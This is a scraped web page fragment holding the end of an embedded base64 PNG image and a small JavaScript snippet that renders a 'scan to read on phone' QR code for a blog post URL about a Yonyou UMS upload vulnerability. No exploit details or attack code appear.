6VNerSu/MqeB9KKb/+4JnD7t9faQ6crFmmItmP3SavWcHOa8esfqUQvmPMy81xWHOVN9apVXq67HVVoteFwH8cfauobo1WO1KlNr5Y0apA9wf9r79mKv47OsmmQt91fXteQiZJrljQui95zcrByS77r+Tod9nTUiJAtBe3c033X5lW8O5vtAOAR7btX3/h7iKb0IngbSp7bjkKlD0K+n59VFmPPqvQ7mnL4I8SEI2OpAswrAx+8ZEOx+z3UOqYOg9RBuXtSXQ3Jd1y88DaTEez3vBI6BQKYHQbcE4TDjoylbW9hzncPcF8J7rnrVgtk3VwjxYMaqq1WZcZVWC5Kv61pm6npcf6tba52ovsJjICvz1n7/BI6BOD3Rrcg7Qp4qdfMdITmYsefsI0LyV7z3WfHeA9LbrL4cHvs9b52482Hua37EYyCjeF8/7wSOgcDj6UF8CPYt+1TAY98686K62HU5pH/ngKWXaK1B4OOnL3lHiA/B7ncOycGM5mCtl38MpMi9nn8Cp4HAeno+VR0heb+U7su7D6mDGc2JMPu7fqVbU9fjUhdh7tl1a9W/i/YR7SMX1QtPAynxXs87gePT3r6F1fQqA/PTZQ5mHcKrphbM3LryxgXJQdCcCNHhjPaBswef/ytye5nvCKl/f1///R/iWwcz7zrMPoRD0P0U3u8QT+9F8PRpb02p1m5/5Y0LzlMu33qYfQiHYGVrma/rcUFyENzlxhozoh7MPbrfOSRvffflormOO18dch/g/nvI24u9ju8h8DkluL726/BpgNSo79C8PqROHcL1rxCSB07RXU/gS793nBr+ESD1EPwjHwBr3QDs/ft7iKf0IngMxKfpCvu+IdO2DmbedXjs2x+Sk+/Q/oVfyYy5uq4FuVdd17JPXdeCtW+uY9XU6rq8vFryEY+BjOJ9/bwTOA0E8jTAjFdbhORr8rUgHIK7eohfNatlnZ4cUgdnNNMRklWHmat7L5h9CNcXrYP4MGP35aJ9Ck8DMXTjc07gxwOpqY4L8nSo9S9rp/ecvOc7N1eoJ5Y2LvUdQvZujbkdh+R3uZ1uvxX+eCCrprf2/RP48UAgT0nfAqx1c7D24bEO8X36RoR4V/fY+fbS/ynCvB/7waxDOHD/pv72Yq/TO8SnpONu3+YgU+45fVFfLkLqOzcv6sshdfD5aS5E6xl5R0geZuw5OSTXed+bvgip6zl54WkgFt/4nBM4BgKZHjzGr26zpl0L0q/XwVrvuc5hrqt7uCCe3Fo5xIeg/g5hzkG4/azrfKfvcpC+wP095O3FXsc75MX29X+7nf8BAAD//3omfSwAAAAGSURBVAMAgWutwsnG/8kAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-business-ums-sendmail-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 